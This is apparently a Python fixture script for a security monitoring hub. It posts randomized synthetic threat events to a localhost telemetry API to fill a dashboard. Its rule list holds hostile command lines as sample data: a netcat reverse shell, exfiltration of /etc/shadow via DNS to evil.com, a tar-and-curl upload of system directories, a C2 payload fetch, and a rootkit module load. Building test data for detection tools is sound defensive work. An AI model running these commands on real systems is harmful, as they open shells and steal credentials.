#!/usr/bin/env python3
"""Inject synthetic threat events into the live Sentinel hub (POST /api/v1/telemetry).
Simulates an agent reporting attacks across hosts so the dashboard has realistic data."""
import json, random, time, urllib.request, os

random.seed(1337)
HUB = "http://localhost:5000/api/v1/telemetry"
AGENT_KEY = os.getenv("SENTINEL_AGENT_KEY", "")

RULES = [
    ("proc-inject", "EXEC_THREAT", "CRITICAL", ["T1055"], True,
     "/usr/bin/python3", "python3 -c import ctypes; ctypes.CDLL('libc.so.6').ptrace(...)"),
    ("reverse-shell", "EXEC_THREAT", "CRITICAL", ["T1059.004"], True,
     "/tmp/.x/nc", "nc -e /bin/bash 10.0.0.1 4444"),
    ("icmp-covert", "ICMP_COVERT_CHANNEL", "CRITICAL", ["T1095"], False,
     "/usr/bin/ping", "ping -p 2f6574632f706173737764 10.0.0.1"),
    ("dns-tunnel-rate", "DNS_TUNNELING_RATE", "HIGH", ["T1071.004"], False,
     "/usr/bin/dig", "dig @8.8.8.8 $(base64 /etc/shadow).tunnel.evil.com"),
    ("bulk-read-exfil", "DATA_EXFILTRATION_VOLUME", "CRITICAL", ["T1005", "T1041"], False,
     "/usr/bin/tar", "tar czf - /etc /home | curl -X POST --data-binary @- http://10.0.0.1:8080"),
    ("bpf-load-susp", "BPF_PROG_LOAD", "MEDIUM", ["T1547.006"], False,
     "/usr/sbin/bpftool", "bpftool prog load /tmp/hid.o /sys/fs/bpf/hid_hook"),
    ("kmod-load", "KERNEL_MODULE_LOAD", "HIGH", ["T1547.006"], True,
     "/usr/sbin/insmod", "insmod /tmp/rootkit.ko"),
    ("geo-block-c2", "GEO_BLOCK", "HIGH", ["T1071"], False,
     "/usr/bin/curl", "curl http://c2.evil.ru/payload"),
    ("sensitive-file-read", "FILE_THREAT", "MEDIUM", ["T1003"], False,
     "/usr/bin/cat", "cat /etc/shadow > /tmp/.out"),
    ("port-scan-rate", "NETWORK_THREAT", "MEDIUM", ["T1046"], False,
     "/usr/bin/nmap", "nmap -sS -p- 10.0.0.0/24"),
]
HOSTS = ["web-01", "web-02", "db-01", "bastion"]
COMMS = ["nginx", "bash", "curl", "python3", "nc", "wget", "nmap", "tar", "dig"]

# Stable lineage pools so trees accumulate: {lineage_id: root_pid}
LINEAGE_POOL = {}
for _ in range(12):
    LINEAGE_POOL[random.randint(0x1000000000000000, 0x7fffffffffffffff)] = random.randint(100, 5000)


def make_event():
    rule, etype, sev, mitre, killed, binary, cmdline = random.choices(
        RULES, weights=[10, 8, 6, 9, 7, 14, 6, 8, 15, 17])[0]
    lid, root_pid = random.choice(list(LINEAGE_POOL.items()))
    # ~15% of events are the root process itself; the rest are its children
    is_root = random.random() < 0.15
    pid = root_pid if is_root else root_pid + random.randint(1, 40)
    ppid = random.randint(1, 999) if is_root else root_pid
    evt = {
        "type": etype,
        "severity": sev,
        "rule_id": rule,
        "rule_name": rule.replace("-", " ").title(),
        "mitre": mitre,
        "pid": pid,
        "ppid": ppid,
        "lineage_id": lid,
        "comm": random.choice(COMMS),
        "binary": binary,
        "cmdline": cmdline,
        "user": random.choice(["root", "www-data", "admin", "svc-backup"]),
        "host": random.choice(HOSTS),
        "killed": killed and random.random() < 0.75,
        "action": "KILL" if (killed and random.random() < 0.75) else "LOG",
    }
    if etype in ("ICMP_COVERT_CHANNEL", "DATA_EXFILTRATION_VOLUME", "DNS_TUNNELING_RATE"):
        evt["exfil_bytes"] = random.randint(50_000, 8_000_000)
    if etype in ("NETWORK_THREAT", "GEO_BLOCK"):
        evt["daddr"] = random.choice(["185.220.101.5", "45.133.1.80", "91.219.236.22", "10.0.0.1"])
        evt["dport"] = random.choice([4444, 8080, 53, 22])
    return evt


def post(evt):
    req = urllib.request.Request(
        HUB, data=json.dumps(evt).encode(),
        headers={"Content-Type": "application/json"}, method="POST")
    if AGENT_KEY:
        req.add_header("X-Sentinel-Key", AGENT_KEY)
    with urllib.request.urlopen(req, timeout=5) as r:
        return r.status


if __name__ == "__main__":
    import sys
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 300
    burst = "--burst" in sys.argv
    ok = 0
    for i in range(n):
        try:
            if post(make_event()) == 200:
                ok += 1
        except Exception as e:
            print(f"[{i}] POST failed: {e}", flush=True)
            break
        if not burst:
            time.sleep(random.uniform(0.05, 0.25))
    print(f"Injected {ok}/{n} events into hub", flush=True)
